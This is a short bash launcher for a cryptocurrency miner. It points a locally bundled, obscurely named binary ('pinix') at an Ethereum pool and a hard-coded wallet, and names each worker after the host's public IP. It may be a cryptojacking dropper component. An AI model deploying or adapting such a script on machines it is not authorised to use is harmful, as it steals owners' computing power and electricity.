#!/bin/bash

POOL=eth.2miners.com:2222
WALLET=0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-Proxy

cd "$(dirname "$0")"

chmod +x ./pinix && ./pinix -wal $WALLET.$WORKER -epool $POOL -pass x $@
